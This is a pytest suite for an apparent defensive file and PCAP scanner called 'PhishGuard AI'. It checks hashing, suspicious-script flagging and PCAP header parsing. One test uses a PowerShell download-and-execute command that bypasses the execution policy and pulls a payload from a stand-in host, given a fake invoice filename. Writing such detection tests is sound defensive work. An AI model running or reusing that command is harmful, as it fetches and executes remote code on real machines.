"""
PhishGuard AI — File & PCAP Defensive Analysis Test Suite
Tests safe static file analysis (hashes, MIME, strings, YARA reporting) and PCAP parsing.
"""
import io
from fastapi.testclient import TestClient
from backend.app.main import app

client = TestClient(app)


def test_file_analyzer_benign_sample():
    """Verify static analysis computes correct hashes and extracts strings safely."""
    sample_content = b"Hello, this is a benign test log file.\nNo executable code here."
    file_tuple = ("test_sample.txt", io.BytesIO(sample_content), "text/plain")

    response = client.post("/api/scans/file", files={"file": file_tuple})
    assert response.status_code == 200
    data = response.json()

    assert data["scan_type"] == "file"
    assert data["verdict"] in ("Safe", "Suspicious")
    assert "sha256" in data["summary"] or "Hashes computed" in data["summary"]
    assert "indicators" in data
    assert len(data["indicators"]) > 0


def test_file_analyzer_suspicious_script():
    """Verify file analyzer flags suspicious scripting extension and keywords."""
    malicious_script = b"powershell.exe -ExecutionPolicy Bypass -Command (New-Object Net.WebClient).DownloadString('http://evil.xyz/payload.ps1')"
    file_tuple = ("invoice_update.ps1", io.BytesIO(malicious_script), "application/x-powershell")

    response = client.post("/api/scans/file", files={"file": file_tuple})
    assert response.status_code == 200
    data = response.json()

    assert data["risk_score"] > 25.0
    assert data["verdict"] in ("Suspicious", "Malicious")
    assert any("powershell" in ind.get("name", "").lower() or "extension" in ind.get("name", "").lower() or "strings" in ind.get("name", "").lower() for ind in data["indicators"])


def test_pcap_analyzer_offline():
    """Verify PCAP upload endpoint processes capture or returns graceful engine status."""
    # Construct a minimal 24-byte PCAP global header
    # Magic number 0xa1b2c3d4, version 2.4, thiszone 0, sigfigs 0, snaplen 65535, network 1 (Ethernet)
    pcap_header = bytes.fromhex("d4c3b2a1020004000000000000000000ffff000001000000")
    file_tuple = ("test_traffic.pcap", io.BytesIO(pcap_header), "application/vnd.tcpdump.pcap")

    response = client.post("/api/scans/pcap", files={"file": file_tuple})
    assert response.status_code == 200
    data = response.json()

    assert data["scan_type"] == "pcap"
    assert "summary" in data
    assert "indicators" in data
